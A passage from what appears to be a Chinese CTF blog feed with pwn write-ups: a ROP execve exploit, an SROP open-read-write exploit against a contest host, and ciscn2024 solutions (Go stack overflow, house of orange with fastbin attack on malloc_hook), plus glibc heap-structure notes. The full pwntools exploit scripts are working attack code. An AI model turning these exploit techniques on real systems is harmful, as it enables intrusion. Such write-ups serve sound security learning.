class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(canary)<br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">################      function     ####################</span><br><span class="hljs-comment">#######################################################</span><br>puts = <span class="hljs-number">0x411770</span><br>write = <span class="hljs-number">0x4489C0</span><br>read = <span class="hljs-number">0x448920</span><br>vuln = <span class="hljs-number">0x401D65</span><br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################    ROPgadget     ####################</span><br><span class="hljs-comment">#######################################################</span><br>pop_rax = <span class="hljs-number">0x4493d7</span> <span class="hljs-comment">#0x00000000004493d7 : pop rax ; ret</span><br>pop_rdi = <span class="hljs-number">0x4018c2</span> <span class="hljs-comment">#0x00000000004018c2 : pop rdi ; ret</span><br>pop_rsi = <span class="hljs-number">0x40f23e</span> <span class="hljs-comment">#0x000000000040f23e : pop rsi ; ret</span><br>pop_rdx = <span class="hljs-number">0x4017cf</span> <span class="hljs-comment">#0x00000000004017cf : pop rdx ; ret</span><br>syscall = <span class="hljs-number">0x4012d3</span> <span class="hljs-comment">#0x00000000004012d3 : syscall</span><br><br>binsh = <span class="hljs-number">0x4c2500</span><br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################       send       ####################</span><br><span class="hljs-comment">#######################################################</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + canary + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(binsh) + p64(pop_rdx) + p64(<span class="hljs-number">0xffff</span>) + p64(read) + p64(vuln)<br>p.sendline(payload1)<br><br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+canary+p64(<span class="hljs-number">0</span>)+p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>p.recvuntil(<span class="hljs-string">b&#x27;input:&#x27;</span>)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="srop-seccomp"><a href="#srop-seccomp" class="headerlink" title="srop_seccomp"></a>srop_seccomp</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>srop，不过加上了seccomp，所以只好用open,read,write三个系统调用获取flag<br>先进行栈迁移，将栈迁移到bss段，在bss段构造sigreturnframe，从而ORW获取flag</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./chall&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>,<span class="hljs-number">32252</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################    ROPgadget     ####################</span><br><span class="hljs-comment">#######################################################</span><br>mov_rax_0xf = <span class="hljs-number">0x401193</span> <span class="hljs-comment">#0x0000000000401193 : mov rax, 0xf ; ret</span><br>syscall = <span class="hljs-number">0x40118a</span><br>leave = <span class="hljs-number">0x40143c</span><br>flag_str = <span class="hljs-number">0x404390</span> <br>flag_addr = <span class="hljs-number">0x405050</span><br>bss = <span class="hljs-number">0x404060</span><br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################       send       ####################</span><br><span class="hljs-comment">#######################################################</span><br>sigframe_open = SigreturnFrame()<br>sigframe_open.rax = constants.SYS_open<br>sigframe_open.rdi = flag_str<br>sigframe_open.rsi = <span class="hljs-number">0</span><br>sigframe_open.rdx = <span class="hljs-number">0</span><br>sigframe_open.rip = syscall<br>sigframe_open.rbp = bss + <span class="hljs-number">0x110</span><br>sigframe_open.rsp = bss + <span class="hljs-number">0x110</span><br><br>sigframe_read = SigreturnFrame()<br>sigframe_read.rax = constants.SYS_read<br>sigframe_read.rdi = <span class="hljs-number">3</span><br>sigframe_read.rsi = flag_addr<br>sigframe_read.rdx = <span class="hljs-number">0x100</span><br>sigframe_read.rip = syscall<br>sigframe_read.rbp = bss + <span class="hljs-number">0x220</span><br>sigframe_read.rsp = bss + <span class="hljs-number">0x220</span><br><br>sigframe_write = SigreturnFrame()<br>sigframe_write.rax = constants.SYS_write<br>sigframe_write.rdi = <span class="hljs-number">1</span><br>sigframe_write.rsi = flag_addr<br>sigframe_write.rdx = <span class="hljs-number">0x100</span><br>sigframe_write.rip = syscall<br>sigframe_write.rbp = bss + <span class="hljs-number">0x330</span><br>sigframe_write.rsp = bss + <span class="hljs-number">0x330</span><br><br>payload1  = p64(<span class="hljs-number">0xaaaa</span>) + p64(mov_rax_0xf) + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe_open)<br>payload1 += p64(<span class="hljs-number">0xaaaa</span>) + p64(mov_rax_0xf) + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe_read)<br>payload1 += p64(<span class="hljs-number">0xaaaa</span>) + p64(mov_rax_0xf) + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe_write)<br>payload1 += <span class="hljs-string">b&#x27;flag&#x27;</span><br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2a</span> + p64(bss) + p64(leave)<br><br>p.recvuntil(<span class="hljs-string">b&quot;easyhack\n&quot;</span>)<br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">b&#x27;Do u know what is SUID?\n&#x27;</span>)<br>p.send(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2024 初赛 wp</title>
      <link href="/2024/05/20/ciscn2024-%E5%88%9D%E8%B5%9B-wp/"/>
      <url>/2024/05/20/ciscn2024-%E5%88%9D%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<p>ciscn2024-初赛-Pwn 的 wp, SuperHeap和magic_vm还没复现</p><span id="more"></span><blockquote><p>pwn和web题目赛后环境 <a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p></blockquote><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>go语言的栈溢出题，开始用的ida7.5，啥也逆不出来，后面换成ida8.3，都不用怎么逆就出来了<br>这里放一下ida7.5和ida8.3打开后的截图</p><p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-ida7.5.png" alt="ida7.5"><br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-ida8.3.png" alt="ida8.3"><br>上面第一张是ida7.5的，第二张是ida8.3的</p><p>大致看一下代码，运行一下，用cyclic测量溢出点<br>go语言运行报错后会直接打印错误的返回地址，就不用gdb调试了<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-cyclic.png"></p><p>得出溢出点464<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-cyclic-l.png"></p><p>其实main_main_func2就是后门函数，不过懒得看代码了，直接用系统调用获取shell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./gostack&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># ROPgadget</span><br>rdi = <span class="hljs-number">0x4a18a5</span> <span class="hljs-comment">#0x00000000004a18a5 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret</span><br>rsi = <span class="hljs-number">0x42138a</span> <span class="hljs-comment">#0x000000000042138a : pop rsi ; ret</span><br>rax = <span class="hljs-number">0x40f984</span> <span class="hljs-comment">#0x000000000040f984 : pop rax ; ret</span><br>rdx = <span class="hljs-number">0x4944ec</span> <span class="hljs-comment">#0x00000000004944ec : pop rdx ; ret</span><br>ret = <span class="hljs-number">0x40201a</span> <span class="hljs-comment">#0x000000000040201a : ret</span><br>syscall = <span class="hljs-number">0x4616C9</span> <span class="hljs-comment">#0x00000000004616C9 : syscall ; ret</span><br><br>addr = <span class="hljs-number">0x5978d8</span> <span class="hljs-comment"># 随便找一个能写的地址，不行就换一个</span><br><br><span class="hljs-comment"># function</span><br>main = <span class="hljs-number">0x04A0AC0</span><br><br><span class="hljs-comment"># send</span><br><span class="hljs-comment">#gdb.attach(p))</span><br><br><span class="hljs-comment"># 在addr处写字符串</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">464</span> + p64(rax) + p64(<span class="hljs-number">0x0</span>) + p64(rdi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(rsi) + p64(addr) + p64(rdx) + p64(<span class="hljs-number">0x30</span>) + p64(syscall)<br><span class="hljs-comment"># 将addr处的字符串作为参数执行sys-execv</span><br>payload+= p64(rax) + p64(<span class="hljs-number">0x3b</span>) + p64(rdi) + p64(addr) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(rsi) + p64(<span class="hljs-number">0</span>) + p64(rdx) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your magic message :&#x27;</span>,payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Your magic message :&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>house of orange + fastbin attack</p><p>一道堆菜单题，但是限制了show和delete的次数<br>每次add操作后申请的堆内存无编号，都是针对ptr的操作<br>edit函数内可以多写8个字节，可以改写下一个chunk的size</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>通过edit溢出修改top_chunk的size，然后通过申请较大的chunk调用sysmalloc函数中的_int_free将原top chunk置入unsorted bin(这是house of orange的攻击手法)</li><li>通过show泄露unsorted bin的bk指针，这个指针会指向main_arena结构体内部的一个成员，通过main_arena与libc的偏移泄露libc基址</li><li>通过伪造chunk进行fastbin attack将堆分配到malloc_hook位置，写上one_gadget</li><li>再次调用malloc即可获取shell</li></ol><h4 id="修改top-chunk的size"><a href="#修改top-chunk的size" class="headerlink" title="修改top chunk的size"></a>修改top chunk的size</h4><p>关于修改top chunk的size，需要修改后的top chunk的满足以下几个条件</p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>对齐到内存页，即size(no_flag_bit)大小需要为2* SIZE_SZ的整数倍<br>所以我们修改top chunk的size为0xf91(0b1111 1001 0001)<br>0xf91最后一位为PRE_INUSE，去掉flag_bit最后4位为零（即满足对齐到内存页），并且大于0x10且小于我们要申请的0x1000</p><p>所以可以修改为0xf91</p><h4 id="计算main-arena与libc基址的偏移"><a href="#计算main-arena与libc基址的偏移" class="headerlink" title="计算main_arena与libc基址的偏移"></a>计算main_arena与libc基址的偏移</h4><p>关于如何计算main_arena与libc的偏移，main_arena是一个全局变量，这里有两种思路可以得知main_arena在libc中的偏移</p><ol><li>利用malloc_trim函数，这个函数会访问main_arena，可以通过这个函数在ida中找到偏移</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>__malloc_trim (<span class="hljs-type">size_t</span> s)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>    ptmalloc_init ();<br><br>  mstate ar_ptr = &amp;main_arena;<span class="hljs-comment">//&lt;=here!</span><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      __libc_lock_lock (ar_ptr-&gt;mutex);<br>      result |= mtrim (ar_ptr, s);<br>      __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>      ar_ptr = ar_ptr-&gt;next;<br>    &#125;<br>  <span class="hljs-keyword">while</span> (ar_ptr != &amp;main_arena);<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/malloc_trim.png"><br>可知本题所用libc与main_arena的偏移为 0x3C4B20</p><ol start="2"><li>利用malloc_hook算出<br>main_arena与malloc_hook的地址差为0x10，而malloc_hook的值可以用pwntools直接查到</li></ol><p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/malloc_hook_and_main_arena.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p>利用这两种方法之一，便可以算出main_arena在libc中的偏移了，得出偏移为0x3C4B20<br>再获取bk和main_arena的偏移，即可计算libc_base</p><h4 id="计算bk与main-arena的偏移"><a href="#计算bk与main-arena的偏移" class="headerlink" title="计算bk与main_arena的偏移"></a>计算bk与main_arena的偏移</h4><p>可以直接调试获取</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; heap<br><span class="hljs-attribute">Allocated</span> chunk | PREV_INUSE<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1000<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x71<br><br><span class="hljs-attribute">Allocated</span> chunk | PREV_INUSE<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1070<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x21<br><br><span class="hljs-attribute">Free</span> chunk (unsortedbin) | PREV_INUSE<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1090<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>xf51<br><span class="hljs-attribute">fd</span>: <span class="hljs-number">0</span>x7e344694bb78<br><span class="hljs-attribute">bk</span>: <span class="hljs-number">0</span>x7e344694bb78<br><br><span class="hljs-attribute">Allocated</span> chunk<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1fe0<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x10<br><br><span class="hljs-attribute">Allocated</span> chunk | PREV_INUSE<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1ff0<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x11<br><br><span class="hljs-attribute">Allocated</span> chunk<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b2000<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x00<br><br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x6549ce9b1070<br><span class="hljs-attribute">0x6549ce9b1070</span>: <span class="hljs-number">0</span>x6161616161616161      <span class="hljs-number">0</span>x0000000000000021<br><span class="hljs-attribute">0x6549ce9b1080</span>: <span class="hljs-number">0</span>x6262626262626262      <span class="hljs-number">0</span>x00007e344694c188<br><span class="hljs-attribute">0x6549ce9b1090</span>: <span class="hljs-number">0</span>x00006549ce9b1070      <span class="hljs-number">0</span>x0000000000000f51<br><span class="hljs-attribute">0x6549ce9b10a0</span>: <span class="hljs-number">0</span>x00007e344694bb78      <span class="hljs-number">0</span>x00007e344694bb78<br><span class="hljs-attribute">0x6549ce9b10b0</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x00007e344694c188<br><span class="hljs-attribute">0x7e344694c188</span> &lt;main_arena+<span class="hljs-number">1640</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c178      <span class="hljs-number">0</span>x00007e344694c178<br><span class="hljs-attribute">0x7e344694c198</span> &lt;main_arena+<span class="hljs-number">1656</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c188      <span class="hljs-number">0</span>x00007e344694c188<br><span class="hljs-attribute">0x7e344694c1a8</span> &lt;main_arena+<span class="hljs-number">1672</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c198      <span class="hljs-number">0</span>x00007e344694c198<br><span class="hljs-attribute">0x7e344694c1b8</span> &lt;main_arena+<span class="hljs-number">1688</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c1a8      <span class="hljs-number">0</span>x00007e344694c1a8<br><span class="hljs-attribute">0x7e344694c1c8</span> &lt;main_arena+<span class="hljs-number">1704</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c1b8      <span class="hljs-number">0</span>x00007e344694c1b8<br><span class="hljs-attribute">pwndbg</span>&gt;<br></code></pre></td></tr></table></figure><p>可知偏移为main_arena+1640</p><p>但也可以通过计算获取，首先我们来看一下main_arena的结构体malloc_state<br>题目的libc是2.23，没有have_fastchunks这个成员，2.27之后新加了该成员，计算时注意一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define(, mutex);<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-type">int</span> have_fastchunks;<span class="hljs-comment">//glibc-2.27新加的一个成员</span><br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins , help to speed up the process of determinating if a given bin is definitely empty */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span>* <span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span>* <span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面分别列出32位与64位该结构体的偏移</p><table><thead><tr><th>结构体成员</th><th>i386</th><th>amd64</th></tr></thead><tbody><tr><td>__libc_lock_define(, mutex);</td><td>4B</td><td>4B</td></tr><tr><td>int flags;</td><td>4B</td><td>4B</td></tr><tr><td>int have_fastchunks;</td><td>4B</td><td>4B</td></tr><tr><td>mfastbinptr fastbinsY[NFASTBINS];</td><td>40B&#x3D;4B*10</td><td>80B&#x3D;8B*10</td></tr><tr><td>mchunkptr top;</td><td>4B</td><td>8B</td></tr><tr><td>mchunkptr last_remainder;</td><td>4B</td><td>8B</td></tr><tr><td>mchunkptr bins[NBINS * 2 - 2];</td><td>1016B&#x3D;4B*254</td><td>2032B&#x3D;8B*254</td></tr><tr><td>unsigned int binmap[BINMAPSIZE];</td><td>16B&#x3D;4B*4</td><td>16B&#x3D;4B*4</td></tr><tr><td>struct malloc_state* next;</td><td>4B</td><td>8B</td></tr><tr><td>struct malloc_state* next_free;</td><td>4B</td><td>8B</td></tr><tr><td>INTERNAL_SIZE_T attached_threads;</td><td>4B</td><td>8B</td></tr><tr><td>INTERNAL_SIZE_T system_mem;</td><td>4B</td><td>8B</td></tr><tr><td>INTERNAL_SIZE_T max_system_mem;</td><td>4B</td><td>8B</td></tr></tbody></table><p>bins数组每两位为一组，存放一个chunk的fd和bk<br><code>chunk=bin_at(1)</code>将<code>&amp;bins[(i-1)*2]-0x10</code>返回，之后调用<code>chunk-&gt;fd</code>即返回<code>bins[0]</code>的值，调用<code>chunk-&gt;bk</code>即返回<code>bins[1]</code>的值</p><table><thead><tr><th>所属bin类型</th><th>bin_at下标</th><th>bins下标</th><th>数量</th></tr></thead><tbody><tr><td>unsorted bin</td><td>1</td><td>0~1</td><td>1</td></tr><tr><td>small bin</td><td>2~63</td><td>2~124</td><td>62</td></tr><tr><td>large bin</td><td>64~126</td><td>125~253</td><td>63</td></tr></tbody></table><p>small bin 大小与下标</p><table><thead><tr><th>bin_at</th><th>SIZE_SZ&#x3D;4(32 位)</th><th>SIZE_SZ&#x3D;8(64 位)</th></tr></thead><tbody><tr><td>2</td><td>16B</td><td>32B</td></tr><tr><td>3</td><td>24B</td><td>48B</td></tr><tr><td>4</td><td>32B</td><td>64B</td></tr><tr><td>5</td><td>40B</td><td>80B</td></tr><tr><td>x</td><td><code>2*4*x</code>B</td><td><code>2*8*x</code>B</td></tr><tr><td>63</td><td>504B</td><td>1008B</td></tr></tbody></table><p>large bin 大小与下标</p><table><thead><tr><th>bin_at</th><th>组</th><th>数量</th></tr></thead><tbody><tr><td>64~95</td><td>1</td><td>32</td></tr><tr><td>96~111</td><td>2</td><td>16</td></tr><tr><td>112~119</td><td>3</td><td>8</td></tr><tr><td>120~123</td><td>4</td><td>4</td></tr><tr><td>124~125</td><td>5</td><td>2</td></tr><tr><td>126</td><td>6</td><td>1</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_32(sz)                                                  \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38)                                     \</span><br><span class="hljs-meta">         ? 56 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span 